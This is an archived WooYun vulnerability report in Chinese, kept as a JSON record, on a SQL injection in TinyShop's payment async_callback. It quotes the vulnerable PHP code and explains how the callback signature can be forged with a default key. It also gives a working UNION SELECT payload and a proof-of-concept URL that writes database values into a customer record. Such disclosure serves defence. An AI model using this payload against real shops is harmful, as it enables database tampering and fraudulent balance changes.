{"id": 43508, "wybug_id": "wooyun-2014-082525", "wybug_title": "TinyShop SQL注入一枚", "wybug_corp": "tinyrise.com", "wybug_author": "zxx", "wybug_date": "2014-11-10 17:20", "wybug_open_date": "2014-12-30 14:44", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-11-15：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-01-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-01-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-30：\t细节向公众公开  简要描述： 20140926 详细说明：  这次这个还是在payment里，是异步callback时候，有类似问题，其实我不想分开交的，其实不想分开交，怕有重复过不了。/protected/controllers/payment.php中  async_callback\nfunction async_callback()    {        //从URL中获取支付方式        $payment_id      = Filter::int(Req::get('payment_id'));        $payment = new Payment($payment_id);        $paymentPlugin = $payment->getPaymentPlugin(); //先获取一个支付方式，默认只有余额支付 ，id为1 。。。        //执行接口回调函数        $callbackData = Req::args();//array_merge($_POST,$_GET);        unset($callbackData['con']);        unset($callbackData['act']);        unset($callbackData['payment_id']);        $return = $paymentPlugin->callback($callbackData,$payment_id,$money,$message,$orderNo);//$callbackData为所有get和post参数，跟进去看看，这个callback在 /protected/classes/payments/pay_balance.php，通过这个函数我们可以控制return和orderNo，没有过滤。       我们让return=1 ，orderNo=recharge_12' union select '111 union select 1,2,3,4,5,user(),7 %23 ',2,3,'778,`addr`=version() ',5,user(),0 %23 _2_3        //支付成功        if($return == 1)        {            //充值方式            if(stripos($orderNo,'recharge_') !== false)            {                $tradenoArray = explode('_',$orderNo);                $recharge_no  = isset($tradenoArray[1]) ? $tradenoArray[1] : 0;                if(Order::recharge($recharge_no,$payment_id)) //recharge 也跟进去看看                {                    $paymentPlugin->asyncStop();                    exit;                }            }  ...        }    }\ncallback 可以控制$return和$orderNo;\npublic function callback($callbackData,&$paymentId,&$money,&$message,&$orderNo)    {        //除去待签名参数数组中的空值和签名参数        $filter_param = $this->filterParam($callbackData);        //对待签名参数数组排序        $para_sort = $this->argSort($filter_param);        //生成签名结果        $payment = new Payment($paymentId);        $paymentInfo = $payment->getPayment();        $mysign = $this->buildSign($para_sort,$paymentInfo['partner_key']);//生成$mysign，利用数据库中余额支付对应的partner_key，这个key是默认不变的。         if($callbackData['sign'] == $mysign)        {            //回传数据            $orderNo = $callbackData['order_no']; //orderNo也可以被我们控制            $money   = $callbackData['total_fee'];            if($callbackData['order_status'] == 'TINY_SECCESS')            {                return true;            }            $message = '支付失败';        }        else        {            $message = '签名不正确';        }        return false;    }\n/protected/classes/Order.php中recharge函数\npublic static function recharge($recharge_no,$payment_id=0){\t\t$model = new Model(\"recharge\");\t\t$recharge = $model->where(\"recharge_no='\".$recharge_no.\"'\")->find();  \t\tvar_dump($recharge);\t\texit();\t\tif(empty($recharge)){\t\t\treturn false;\t\t}\t\tif($recharge['status']==1){\t\t\treturn $recharge['id'];\t\t}else{  //因为没有回显，控制recharge['status']不等于1\t\t\t//更新充值订单信息\t\t\t$model->data(array('status'=>1))->where(\"recharge_no='\".$recharge_no.\"'\")->update();\t\t\t$account = $recharge['account'];\t\t\t$user_id = $recharge['user_id'];\t\t\t//给用户充值\t\t\t$result = $model->table(\"customer\")->data(array('balance'=>\"`balance`+\".$account))->where(\"user_id=\".$user_id)->update();  //利用这里，更新一下addr=version();\t\t\tif($result){\t\t\t\t//填写收款单\t\t\t\t$receivingData = array(\t\t\t\t\t'order_id'=>$recharge['id'],\t\t\t\t\t'user_id'=>$user_id,\t\t\t\t\t'amount'=>$account,\t\t\t\t\t'create_time'=>date('Y-m-d H:i:s'),\t\t\t\t\t'payment_time'=>date('Y-m-d H:i:s'),\t\t\t\t\t'doc_type'=>1,\t\t\t\t\t'payment_id'=>$payment_id,\t\t\t\t\t'pay_status'=>1\t\t\t\t);\t\t\t\t$model->table(\"doc_receiving\")->data($receivingData)->insert();\t\t\t\t\t\t\t\t//写充值日志\t\t\t\tLog::balance($account,$user_id,'用户充值,充值编号：'.$recharge_no,1);\t\t\t\treturn $recharge['id'];\t\t\t}\t\t\treturn false;\t\t}\t}\n生成sign的函数\npublic function buildSign($sort_para,$key,$sign_type = \"MD5\") { //把数组所有元素，按照“参数=参数值”的模式用“&”字符拼接成字符串 $prestr = $this->createLinkstring($sort_para); //把拼接后的字符串再与安全校验码直接连接起来 $prestr = $prestr.$key; $mysgin = md5($prestr); return $mysgin; }\n 同之前发的，不具体跟了，我们做一个代理，帮我们生成sign就好。   漏洞证明：  http://127.0.0.1/tinyshop/index.php?con=payment&act=async_callback&payment_id=1order_no=recharge_12' union select '111 union select 1,2,3,4,5,6,7 %23 ',2,3,'778,`addr`=version() ',5,user(),0 %23 _2_3&order_status=TINY_SECCESS\n\n看看写进去了\n\n   修复方案：  过滤参数，随机sign   版权声明：转载请注明来源 zxx@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-12-30 14:44 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}